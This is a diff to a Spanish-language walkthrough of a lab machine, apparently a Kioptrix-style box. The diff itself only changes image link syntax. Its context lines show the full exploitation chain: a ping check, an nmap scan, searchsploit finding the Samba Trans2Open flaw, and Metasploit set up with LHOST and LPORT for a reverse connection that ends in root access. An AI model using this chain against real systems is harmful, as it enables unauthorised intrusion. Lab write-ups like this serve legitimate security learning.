@@ -20,8 +20,8 @@ El primer paso fue verificar que la máquina objetivo estuviera activa dentro de
 ping 192.168.100.79
 ```
 
-![[/assets/img/commons/KioWriteup/Vista_Pagina.png]]
-![[/assets/img/commons/KioWriteup/ping_ip.png]]
+![Vista_Pagina](/assets/img/commons/KioWriteup/Vista_Pagina.png)
+![ping_ip](/assets/img/commons/KioWriteup/ping_ip.png)
 
 La respuesta del servidor confirmó que el host se encontraba disponible y listo para comenzar las siguientes fases del análisis.
 
@@ -35,7 +35,7 @@ Con la conectividad confirmada, procedí a realizar un escaneo utilizando Nmap p
 nmap -sV -sC 192.168.100.79
 ```
 
-![[/assets/img/commons/KioWriteup/escaneo_samba.png]]
+![escaneo_samb](/assets/img/commons/KioWriteup/escaneo_samba.png)
 
 Entre los resultados obtenidos llamó mi atención el puerto **139**, asociado al servicio **Samba**.
 
@@ -73,7 +73,7 @@ A continuación, utilicé Searchsploit para buscar vulnerabilidades públicas as
 searchsploit samba 2.2
 ```
 
-![[/assets/img/commons/KioWriteup/busqueda_exploit.png]]
+![busqueda_exploit](/assets/img/commons/KioWriteup/busqueda_exploit.png)
 
 Entre los resultados apareció la vulnerabilidad **Trans2Open**, una falla conocida que permite ejecución remota de código en determinadas versiones de Samba.
 
@@ -100,7 +100,7 @@ set LHOST 192.168.100.72
 set LPORT 4444
 ```
 
-![[/assets/img/commons/KioWriteup/configuracion_exploit 1.png]]
+![configuracion_exploit](/assets/img/commons/KioWriteup/configuracion_exploit.png)
 
 Finalmente ejecuté el exploit:
 
@@ -114,7 +114,7 @@ Tras unos segundos obtuve acceso remoto al sistema.
 whoami
 ```
 
-![[/assets/img/commons/KioWriteup/run_exploit.png]]
+![run_exploit](/assets/img/commons/KioWriteup/run_exploit.png)
 
 La salida confirmó que se había conseguido acceso con privilegios elevados (ROOT) sobre la máquina objetivo.
 
